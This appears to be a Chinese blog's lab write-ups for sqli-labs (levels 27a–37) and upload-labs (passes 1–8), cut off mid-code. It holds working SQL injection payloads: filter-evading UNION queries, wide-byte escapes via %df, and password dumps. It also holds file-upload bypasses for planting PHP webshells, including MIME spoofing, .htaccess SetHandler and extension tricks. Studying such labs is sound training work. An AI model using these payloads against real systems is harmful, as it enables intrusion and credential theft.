<h1 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h1><p><code>1</code>和<code>1&#39;</code>正常回显，<code>1&quot;</code>报错，双引号字符型。<br><code>2&quot;%26%26&quot;1&quot;=&quot;1</code>回显为<code>id=2</code>，无小括号<br>与上一关一样正常注入</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">库名</span><br><span class="line">id=<span class="number">0</span>%22%0AUNIon%0AsElect%0A1,database(),<span class="number">3</span>%a0or%22		<span class="comment">#注：id=0</span></span><br><span class="line">列名</span><br><span class="line">id=<span class="number">0</span>%22%0AUNIon%0AsElect%0A1,group_concat(column_name),<span class="number">3</span>%0afrom%a0information_schema.columns%0awhere%0atable_name=%27users%27%a0or%22</span><br><span class="line">内容</span><br><span class="line">id=<span class="number">0</span>%22%0AUNIon%0AsElect%0A1,(sElect%a0password%a0from%a0users%a0limit%a03,<span class="number">1</span>),<span class="number">3</span>%a0or%22</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/21.png" alt></p>
<h1 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h1><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="attribute">id</span>=1		正常</span><br><span class="line"><span class="attribute">id</span>=1'		错误</span><br><span class="line"><span class="attribute">id</span>=1"		正常</span><br><span class="line"><span class="attribute">id</span>=1'%0Aor%0A1=1%0Aor'		正常，成功闭合单引号</span><br></pre></td></tr></table></figure>

<p>当使用<code>union select</code>查询字段是，发现只要同时出现union和select变回删除union和select<br><img src="/2020/03/17/sqli_labs21-37/22.png" alt><br>我们可以双写绕过<br>但是字段任然爆不出来,后面才发现原来没有测试是否有小括号判断小括号有几种方法：</p>
<ol>
<li><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1</code></li>
</ol>
<ul>
<li>若查询语句为<code>where id=&#39;$id&#39;</code>，查询时是<code>where id=&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;</code>，结果是<code>where id=&#39;2&#39;</code>，回显会是<code>id=2</code>。</li>
<li>若查询语句为<code>where id=(&#39;$id&#39;)</code>，查询时是<code>where id=(&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;)</code>，MySQL 将<code>&#39;2&#39;</code>作为了 Bool 值，结果是<code>where id=(&#39;1&#39;)</code>，回显会是<code>id=1</code>。</li>
</ul>
<ol start="2">
<li><code>1&#39;)||&#39;1&#39;=(&#39;1</code><br> 若查询语句有小括号正确回显，若无小括号错误回显（无回显）。</li>
</ol>
<p>我们使用第二种方法，发现正常回显，说明有小括号<br><img src="/2020/03/17/sqli_labs21-37/23.png" alt></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">字段</span><br><span class="line">id=<span class="number">1</span>')%<span class="number">0</span>Aunion%<span class="number">0</span>Aunion%<span class="number">0</span>Aselect%<span class="number">0</span>Aselect%<span class="number">0</span>A1,<span class="number">2</span>,<span class="number">3</span>%<span class="number">0</span>Aor('</span><br><span class="line">表名</span><br><span class="line">id=<span class="number">1</span>')%<span class="number">0</span>Aunion%<span class="number">0</span>Aunion%<span class="number">0</span>Aselect%<span class="number">0</span>Aselect%<span class="number">0</span>A1,group_concat(table_name),<span class="number">3</span>%<span class="number">0</span>afrom%<span class="number">0</span>ainformation_schema.tables%<span class="number">0</span>awhere%<span class="number">0</span>atable_schema=database()%<span class="number">0</span>Aor('</span><br><span class="line">列名</span><br><span class="line">id=<span class="number">0</span>')%<span class="number">0</span>Aunion%<span class="number">0</span>Aunion%<span class="number">0</span>Aselect%<span class="number">0</span>Aselect%<span class="number">0</span>A1,group_concat(column_name),<span class="number">3</span>%<span class="number">0</span>Afrom%<span class="number">0</span>Ainformation_schema.columns%<span class="number">0</span>Awhere%<span class="number">0</span>Atable_name='users'%<span class="number">0</span>Aor('</span><br><span class="line">内容</span><br><span class="line">id=<span class="number">0</span>')%<span class="number">0</span>Aunion%<span class="number">0</span>Aunion%<span class="number">0</span>Aselect%<span class="number">0</span>Aselect%<span class="number">0</span>A1,(select%<span class="number">0</span>Ausername%<span class="number">0</span>Afrom%<span class="number">0</span>Ausers%<span class="number">0</span>Alimit%<span class="number">0</span>A2,<span class="number">1</span>),<span class="number">3</span>%<span class="number">0</span>Aor('</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/24.png" alt></p>
<h1 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h1><p>这一关用less-28的payload也可以</p>
<h1 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h1><p>这个是简单的单引号字符型注入，使用联合注入就可以了，29-31实际上是两层服务器架构，在做这三关之前需要把 Tomcat 为引擎的 jsp 服务器搭好，等以后再回来搭一下</p>
<h1 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h1><p>这一关为双引号字符型注入</p>
<h1 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h1><p>简单测试后，为双引号+有括号字符型注入，接着与30关一样</p>
<p><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
<h1 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h1><p>这一关发现hint多了一个<code>The Query String you input in Hex becomes :</code><br>当我们输入</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">id=1		正常回显</span><br><span class="line">id=1'		错误回显</span><br></pre></td></tr></table></figure>

<p>并且发现我们的<code>&#39;</code>被<code>\</code>注释掉了，这个便联想到宽字节注入</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>PHP 自带一些转义特殊字符的函数，如<code>addslashes()</code>，<code>mysql_real_escape_string()</code>，<code>mysql_escape_string()</code>等，这些函数可用来防止 SQL 注入。</p>
<p>如<code>id=1&#39;or&#39;1&#39;=&#39;1</code>，单引号本用来闭合语句，这些函数会自动转义这些闭合的单引号，在这些单引号前面加上转义符<code>\</code>，变为<code>1\&#39;or\&#39;1\&#39;=\&#39;1</code>，如此在 SQL 查询中仍然一个普通的字符串，不能进行注入。</p>
<p>而网站在过滤<code>&#39;</code>的时候，通常的思路就是将<code>&#39;</code>转换为<code>\&#39;</code>,因此我们在此想办法将<code>&#39;</code>前面添加的<code>\</code>去掉，一般有两种思路：</p>
<ol>
<li><code>%bb</code>连带<code>\</code><br>如果程序的默认字符集是<code>GBK</code>等宽字节字符集，就有可能产生宽字节注入，绕过上述过滤。<br>若在 PHP 中使用<code>mysql_query(&quot;set names gbk&quot;)</code>将默认字符集设为<code>GBK</code>，而使用<code>addslashes()</code>转义用户输入，这时如果用户输入<code>%bb%27</code>，则<code>addslashes()</code>会在<code>%27</code>前面加上一个<code>%5c</code>字符，即转义字符<code>\</code>。<br>而 MySQL 在使用<code>GBK</code>编码时，会认为两个字符为一个汉字，<code>%bb%5c</code>是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），也就是<code>籠</code>，也就是说<code>%bb%5c%27</code>=<code>籠&#39;</code>，这样单引号就未被转义能闭合语句，从而产生 SQL 注入。<code>%bb</code>并不是唯一一个可以产生宽字节注入的字符，理论上<code>%81</code>-<code>%FE</code>均可。</li>
<li>过滤<code>\&#39;</code>中的<code>\</code><br>构造<code>%bb%5c%5c%27</code>，<code>addslashes()</code>会在两个<code>%5c</code>和<code>%27</code>前都加上<code>\</code>即<code>%5c</code>，变为<code>%bb %5c%5c %5c%5c %5c%27</code>，但宽字符集认为<code>%bb%5c</code>是一个字符即<code>籠</code>，则变为<code>%bb%5c %5c%5c %5c%5c %27</code>即<code>籠\\\\&#39;</code>，四个<code>\</code>正好转义为两个<code>\</code>，即<code>&#39;</code>未被转义。</li>
</ol>
<p><a href="https://www.jianshu.com/p/fa6664786f73" target="_blank" rel="noopener">参考文章链接</a></p>
<p>这里还可以用%df来讲<code>\</code>吃掉，组合成一个新的汉字<br><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt><br>然后使用–+闭合<br>经过测试，发现是单引号闭合的宽字节注入</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">id=<span class="number">-1</span>%df%<span class="number">27</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(id,password),<span class="number">3</span>%<span class="number">20f</span>rom%<span class="number">20</span>users--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
<h1 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h1><p>本关直接使用了 PHP 的<code>addslashes()</code>函数，在 Less 17 中介绍过：</p>
<h2 id="addslashes-与stripslashes-函数"><a href="#addslashes-与stripslashes-函数" class="headerlink" title="addslashes()与stripslashes()函数"></a>addslashes()与stripslashes()函数</h2><p><code>addslashes(string)</code>函数返回在预定义字符之前添加<strong>反斜杠</strong><code>\</code>的字符串：</p>
<ul>
<li>单引号 <code>&#39;</code> </li>
<li>双引号 <code>&quot;</code> </li>
<li>反斜杠 <code>\</code> </li>
<li>空字符 <code>NULL</code> </li>
</ul>
<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
<blockquote>
<p><strong>注意：</strong>默认地，PHP对所有的GET、POST和COOKIE数据自动运行<code>addslashes()</code>。所以不应对已转义过的字符串使用<code>addslashes()</code>，因为这样会导致双层转义。遇到这种情况时可以使用函数<code>get_magic_quotes_gpc()</code>进行检测。</p>
</blockquote>
<p><code>stripslashes(string)</code>函数删除由<code>addslashes()</code>函数添加的反斜杠。</p>
<p>注入方法与33一样<br><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
<h1 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h1><p>这一关为post提交方式<br>先抓包，发现也是宽字节注入，只是提交参数方式不同</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1%df'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
<h1 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h1><p>这一关一开始以为也是宽字节注入，后面发现无论怎么都不能闭合，但是仔细一看回显，发现了问题。如果是宽字节注入，当<code>&#39;</code>被<code>\</code>转义后应该正常回显，但是这一关却报错。<img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt><br>所以尝试一下数字型注入，发现成功。与less-1一样</p>
<h1 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h1><h2 id="mysql-real-escape-string-函数"><a href="#mysql-real-escape-string-函数" class="headerlink" title="mysql_real_escape_string()函数"></a>mysql_real_escape_string()函数</h2><blockquote>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">mysql<span class="constructor">_real_escape_string(<span class="params">string</span>,<span class="params">connection</span>)</span></span><br></pre></td></tr></table></figure>
</blockquote>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需，规定要转义的字符串</td>
</tr>
<tr>
<td>connection</td>
<td>可选，规定MySQL连接。如果未规定，则使用上一个连接</td>
</tr>
</tbody></table>
<p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符：</p>
<ul>
<li><code>\x00</code></li>
<li><code>\n</code></li>
<li><code>\r</code></li>
<li><code>\</code></li>
<li><code>&#39;</code></li>
<li><code>&quot;</code></li>
<li><code>\x1a</code></li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回<code>FALSE</code>。</p>
<blockquote>
<p>本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于<code>mysql_query()</code>，可使用本函数来预防数据库攻击。</p>
</blockquote>
<p>与less-32一样</p>
<h1 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h1><p>这关又是post，注入方法与less-34一样<img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
<p>page2到这里就结束了！听物理课了</p>
<p><a href="https://www.jianshu.com/p/fa6664786f73" target="_blank" rel="noopener">参考文章链接</a></p>
]]></content>
      <tags>
        <tag>sqli_labs</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2020/03/08/upload-labs/</url>
    <content><![CDATA[<p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。现在准备通过uploads-labs来巩固以前的知识并学习一些上传绕过的新知识。<a id="more"></a></p>
<p><img src="/2020/03/08/upload-labs/1.png" alt></p>
<h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><p>直接上传PHP木马，发现弹窗报错<br><img src="/2020/03/08/upload-labs/2.png" alt><br>然后发现是前端js验证，于是抓包修改后缀进行绕过<br><img src="/2020/03/08/upload-labs/3.png" alt><br>上传成功并成功连接shell<br><img src="/2020/03/08/upload-labs/4.png" alt><br><img src="/2020/03/08/upload-labs/5.png" alt></p>
<h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现限制的是文件的mime类型<br>mime类型：MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。只有jpg的mime类型是image/jpeg</p>
<p>然后上传PHP文件，抓包修改mime类型为image/jpeg即可<br><img src="/2020/03/08/upload-labs/6.png" alt><br>上传成功，并成功利用<br><img src="/2020/03/08/upload-labs/7.png" alt><br><img src="/2020/03/08/upload-labs/8.png" alt></p>
<h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><p>黑名单绕过<br>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次直接限制了不允许上传PHP文件，但是这个过滤不严谨，php中，如果默认状态下.php3,.php4,.php5,.phtml 都是会被解析为php的<br>一些常见的能被解析的文件扩展名</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">jsp </span> <span class="keyword">jspx </span> <span class="keyword">jspf </span> asp  asa  cer   aspx  PHP  php3   php4  exe   exee</span><br></pre></td></tr></table></figure>

<p>这里我们只需要上传php3或者phtml文件即可<br><img src="/2020/03/08/upload-labs/9.png" alt><br><img src="/2020/03/08/upload-labs/10.png" alt><br><img src="/2020/03/08/upload-labs/14.png" alt></p>
<h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><p>查看源码，发现过滤了极大多数后缀名<br><img src="/2020/03/08/upload-labs/11.png" alt><br>但是没有过滤.htaccess，上传一个.htaccess内容 SetHandler application/x-httpd-php 这样所有文件都会解析为php。但是由于直接创建txt文档会显示必须键入文件名，所以可以采用cmd命令方式生成</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> SetHandler application/x-httpd-php  &gt; <span class="string">.htaccess</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/08/upload-labs/12.png" alt><br>上传之后再上传写有木马的txt文件，txt文件也可被解析。<br><img src="/2020/03/08/upload-labs/13.png" alt></p>
<h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><p>查看源码，发现其残忍的过滤了.htaccess</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是源代码中没有<code>$file_ext = strtolower($file_ext); //转换为小写</code>这一行代码，可以使用大小写绕过。<br><img src="/2020/03/08/upload-labs/15.png" alt><br><img src="/2020/03/08/upload-labs/16.png" alt></p>
<h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><p>查看源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现其没有对首尾去除空格，于是我们可以用bp截断，然后再文件明后面添加空格进行绕过<br><img src="/2020/03/08/upload-labs/17.png" alt><br><img src="/2020/03/08/upload-labs/18.png" alt><br>成功getshell</p>
<h1 id="pass-7"><a href="#pass-7" class="headerlink" title="pass-7"></a>pass-7</h1><p>查看源码还是黑名单没有对后缀名进行去.操作利用Windows特性会自动去掉后缀名中最后的.可在后缀名中加 . 绕过。<br><img src="/2020/03/08/upload-labs/19.png" alt><br>上传成功并利用<br><img src="/2020/03/08/upload-labs/20.png" alt></p>
<h1 id="pass-8"><a href="#pass-8" class="headerlink" title="pass-8"></a>pass-8</h1><p>查看源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span 